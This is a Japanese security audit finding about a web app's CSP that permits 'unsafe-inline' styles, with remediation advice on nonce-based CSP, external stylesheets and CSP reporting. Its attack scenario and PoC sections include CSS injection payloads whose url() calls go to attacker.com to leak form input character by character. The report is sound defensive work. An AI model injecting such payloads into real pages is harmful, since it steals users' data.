# 🟡 CSP設定不備 - unsafe-inline によるXSSリスク増大

## メタデータ
```yaml
id: vuln-006
version: v1
iteration: 1
language: html
category: xss
cwe_id: CWE-1385
cvss_score: 4.7
severity: Medium
priority: P2
discovered: 2025-11-21 00:00
status: New
related_vulns: []
```

## 🎯 要約
Content Security Policy (CSP)の`style-src`ディレクティブで`'unsafe-inline'`を許可しており、インラインスタイルによるXSS攻撃のリスクが増大しています。

## 📍 発生場所
- **ファイル**: `index.html`
- **行番号**: L6-17
- **関数**: なし
- **エンドポイント**: すべてのHTMLページ

## 💣 詳細

### 問題コード
```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: blob:;
    connect-src 'self';
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
">
```

### 根本原因
- `style-src 'self' 'unsafe-inline'`で`'unsafe-inline'`を許可
- インラインスタイル（`<div style="...">`や`<style>`タグ）が許可される
- XSS攻撃者がインラインスタイルを注入できる場合、CSSインジェクション攻撃が可能
- `expression()`（IE）やデータ窃取攻撃（CSS-based exfiltration）のリスク

### 攻撃シナリオ
**シナリオ1: CSS-based Data Exfiltration**
1. 攻撃者がXSS脆弱性を発見（仮定）
2. インラインスタイルを注入：
   ```html
   <style>
   input[value^="a"] {
       background: url('https://attacker.com/exfil?char=a');
   }
   </style>
   ```
3. ユーザーが入力フィールドに情報を入力
4. CSSセレクタが一致し、攻撃者のサーバーにリクエストが送信される
5. 1文字ずつ情報を窃取

**シナリオ2: UI Redressing（古いブラウザ）**
1. 攻撃者がインラインスタイルを注入
2. 重要なボタンを隠蔽し、偽のボタンを表示
3. ユーザーが意図しない操作を実行

**注意**: このアプリケーションではXSS対策（`escapeHtml`、`sanitizeInput`）が実装されているため、実際にXSSが成功する可能性は低い。しかし、CSPは多層防御の一環として、より厳格にすべき。

### 影響範囲
- **機密性**: Medium（XSSが成功した場合、CSS-based exfiltrationが可能）
- **完全性**: Low（UI改ざん）
- **可用性**: None
- **影響ユーザー**: すべてのユーザー（XSS脆弱性が存在する場合）

## 🔗 関連脆弱性
なし（現時点でXSS脆弱性は検出されていない）

## 🔬 検証手順 (PoC)

### 前提条件
- XSS脆弱性が存在する（仮定）
- ブラウザがCSPをサポート

### 再現ステップ
```html
<!-- 仮想的なXSSペイロード -->
<!-- 1. インラインスタイルを注入（XSS経由） -->
<div style="background: url('https://attacker.com/log?data=leaked');">Test</div>

<!-- 2. スタイルタグを注入 -->
<style>
body {
    background: url('https://attacker.com/log?page=loaded');
}
</style>

<!-- 3. ブラウザ開発者ツールで外部リクエストを確認 -->
<!-- CSPが'unsafe-inline'を許可しているため、リクエストが送信される -->
```

## 🛡️ 推奨対策

### 短期
- [ ] `'unsafe-inline'`を削除し、nonceまたはハッシュベースのCSPを使用
- [ ] 以下のように修正：

**方法1: Nonce-based CSP（推奨）**
```html
<!-- ❌ Before -->
<meta http-equiv="Content-Security-Policy" content="
    style-src 'self' 'unsafe-inline';
">

<!-- ✅ After -->
<meta http-equiv="Content-Security-Policy" content="
    style-src 'self' 'nonce-{{RANDOM_NONCE}}';
">

<!-- インラインスタイルにnonceを追加 -->
<style nonce="{{RANDOM_NONCE}}">
/* スタイル */
</style>
```

**方法2: すべてのスタイルを外部CSSに移動（最も簡単）**
```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
    style-src 'self';
">

<!-- app.js内のインラインスタイル設定を削除し、CSSクラスを使用 -->
```

### 長期
- [ ] すべてのインラインスタイル（`element.style.xxx = ...`）を削除し、CSSクラスを使用
  ```javascript
  // ❌ Before (app.js L932-990)
  deleteBtn.style.backgroundColor = '#ff4444';
  deleteBtn.style.color = 'white';
  deleteBtn.style.border = 'none';

  // ✅ After
  deleteBtn.className = 'delete-preview-btn';
  // styles.cssで定義
  // .delete-preview-btn {
  //     background-color: #ff4444;
  //     color: white;
  //     border: none;
  // }
  ```
- [ ] CSPレポート機能を有効化し、違反を監視
  ```html
  <meta http-equiv="Content-Security-Policy" content="
      style-src 'self';
      report-uri /api/csp-report;
  ">
  ```
- [ ] 段階的にCSPを厳格化（Report-Only → Enforcing）
- [ ] 自動化されたCSP検証をCI/CDに組み込み

## 🔗 参考
- OWASP CSP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- CWE: https://cwe.mitre.org/data/definitions/1385.html
- MDN CSP: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- CSS Exfiltration: https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense

---
*Iteration 1 | 2025-11-21 00:00 JST*
